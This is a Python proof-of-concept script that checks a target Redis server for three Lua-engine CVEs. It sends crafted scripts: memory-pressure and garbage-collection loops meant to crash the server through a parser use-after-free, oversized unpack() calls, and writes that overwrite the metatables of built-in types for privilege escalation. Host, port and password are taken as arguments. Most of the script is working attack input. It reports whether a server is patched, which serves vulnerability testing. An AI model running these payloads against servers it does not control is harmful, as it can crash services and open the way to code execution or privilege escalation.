#!/usr/bin/env python3
"""
PoC for Redis Lua Vulnerabilities (3 CVEs)

CVE-2025-49844: Use-After-Free in Lua Parser
  - Location: deps/lua/src/lparser.c:387
  - Risk: Remote Code Execution via GC during parsing
  - Fixed: 5785f3e6e, db884a49b, 155519b19, 02b16202a, d5728cb57

CVE-2025-46817: Integer Overflow in unpack()
  - Location: deps/lua/src/lbaselib.c (luaB_unpack)
  - Risk: Remote Code Execution via integer overflow
  - Fixed: 72be22dff

CVE-2025-46818: Privilege Escalation via Metatable Modification
  - Location: src/script_lua.c, src/eval.c, src/function_lua.c
  - Risk: Script execution in context of another user
  - Fixed: 61e56c1a7

This PoC tests for all three vulnerabilities with detailed evidence.
"""

import redis
import sys
import argparse
import time
import string
import random


class CVE_2025_49844_PoC:
    """Proof of Concept for CVE-2025-49844 - Lua Parser Use-After-Free"""

    def __init__(self, host='127.0.0.1', port=6379, password=None, db=0):
        """Initialize PoC tester"""
        try:
            self.client = redis.Redis(
                host=host,
                port=port,
                password=password,
                db=db,
                decode_responses=False,
                socket_timeout=5,
                socket_connect_timeout=5
            )
            self.client.ping()
            print(f"[+] Connected to Redis: {host}:{port}")
        except redis.ConnectionError as e:
            print(f"[-] ERROR: Cannot connect to Redis server: {e}")
            sys.exit(1)

    def test_5_use_after_free_trigger(self):
        """Test 5: Direct use-after-free trigger attempt - AGGRESSIVE"""
        print("="*70)
        print("[TEST 5] Use-After-Free Trigger - AGGRESSIVE Test")
        print("[!] Attempts to trigger GC exactly during luaY_parser execution")
        print("="*70)

        try:
            # Step 1: Fill Lua memory with MASSIVE objects
            print("[*] Step 1: Creating extreme Lua VM memory pressure...")
            for i in range(50):
                huge_script = "local t = {}; " + "; ".join(
                    [f"t[{j}] = string.rep('X', 10000)" for j in range(50)]
                ) + "; return 'full'"
                self.client.eval(huge_script, 0)
                if i % 10 == 0:
                    print(f"[*]   Memory fill: {i+1}/50...")

            # Step 2: Interleaved GC + new script parsing
            print("[*] Step 2: Rapid interleaved GC + script parsing...")
            for i in range(200):
                if i % 2 == 0:
                    self.client.eval("collectgarbage('collect'); return 'gc'", 0)
                else:
                    unique_script = f"-- Unique script {i} {random.randint(0, 999999)}\n"
                    unique_script += "local t = {}; for j=1,200 do t[j] = {} end; return " + str(i)
                    self.client.eval(unique_script, 0)

            print("[+] Server survived use-after-free attempts")
            return True

        except redis.exceptions.ConnectionError as e:
            print(f"[!] SERVER CRASHED - VULNERABLE to CVE-2025-49844!")
            return False

    def test_8_unpack_integer_overflow(self):
        """Test 8: Test for CVE-2025-46817 (unpack integer overflow)"""
        print("="*70)
        print("[TEST 8] Integer Overflow in unpack() - CVE-2025-46817")
        print("="*70)

        tests = [
            {
                "script": "return {unpack({1,2,3}, -2, 2147483647)}",
                "description": "unpack({1,2,3}, -2, 2147483647)",
                "should_error": True,
                "error_pattern": "too many results to unpack"
            },
            {
                "script": "return {unpack({1,2,3}, 0, 2147483647)}",
                "description": "unpack({1,2,3}, 0, 2147483647)",
                "should_error": True,
                "error_pattern": "too many results to unpack"
            },
            {
                "script": "return {unpack({1,2,3}, -2147483648, -2)}",
                "description": "unpack({1,2,3}, -2147483648, -2)",
                "should_error": True,
                "error_pattern": "too many results to unpack"
            },
        ]

        vulnerable_count = 0
        patched_count = 0

        for i, test in enumerate(tests, 1):
            print(f"\n[*] Subtest {i}: {test['description']}")

            try:
                result = self.client.eval(test['script'], 0)
                if test['should_error']:
                    print(f"[!] VULNERABLE: Server accepted dangerous unpack()!")
                    vulnerable_count += 1
            except redis.exceptions.ResponseError as e:
                if test['error_pattern'] in str(e):
                    print(f"[+] PATCHED: Server correctly rejected")
                    patched_count += 1

        if vulnerable_count > 0:
            print(f"\n[!] VULNERABLE to CVE-2025-46817")
        else:
            print(f"\n[+] Protected against CVE-2025-46817")

        return vulnerable_count == 0

    def test_9_metatable_privilege_escalation(self):
        """Test 9: Test for CVE-2025-46818 (Lua script privilege escalation)"""
        print("="*70)
        print("[TEST 9] Metatable Privilege Escalation - CVE-2025-46818")
        print("="*70)

        tests = [
            {
                "script": "getmetatable(nil).__index = function() return 1 end",
                "type": "nil"
            },
            {
                "script": "getmetatable('').__index = function() return 1 end",
                "type": "string"
            },
            {
                "script": "getmetatable(123.222).__index = function() return 1 end",
                "type": "number"
            },
            {
                "script": "getmetatable(true).__index = function() return 1 end",
                "type": "boolean"
            },
        ]

        vulnerable_count = 0
        patched_count = 0

        for i, test in enumerate(tests, 1):
            print(f"\n[*] Subtest {i}: Modify {test['type']} metatable")

            try:
                result = self.client.eval(test['script'], 0)
                print(f"[!] VULNERABLE: Modified {test['type']} metatable!")
                vulnerable_count += 1

            except redis.exceptions.ResponseError as e:
                error_msg = str(e)
                if "readonly" in error_msg.lower() or "nil value" in error_msg:
                    print(f"[+] PROTECTED: {test['type']} metatable is readonly")
                    patched_count += 1

        if vulnerable_count > 0:
            print(f"\n[!] VULNERABLE to CVE-2025-46818")
        else:
            print(f"\n[+] Protected against CVE-2025-46818")

        return vulnerable_count == 0

    def run_all_tests(self):
        """Run all PoC tests"""
        print("\n[*] Starting vulnerability tests...\n")

        results = []
        results.append(self.test_5_use_after_free_trigger())
        results.append(self.test_8_unpack_integer_overflow())
        results.append(self.test_9_metatable_privilege_escalation())

        print("\n" + "="*70)
        print("SUMMARY")
        print("="*70)
        passed = sum(1 for r in results if r)
        print(f"Tests passed: {passed}/{len(results)}")


def main():
    parser = argparse.ArgumentParser(
        description='Redis Lua Vulnerabilities PoC - Tests for 3 Critical CVEs'
    )
    parser.add_argument('--host', default='localhost', help='Redis host')
    parser.add_argument('--port', type=int, default=6379, help='Redis port')
    parser.add_argument('--password', help='Redis password')
    parser.add_argument('--db', type=int, default=0, help='Redis database')

    args = parser.parse_args()

    poc = CVE_2025_49844_PoC(
        host=args.host,
        port=args.port,
        password=args.password,
        db=args.db
    )

    poc.run_all_tests()


if __name__ == '__main__':
    main()

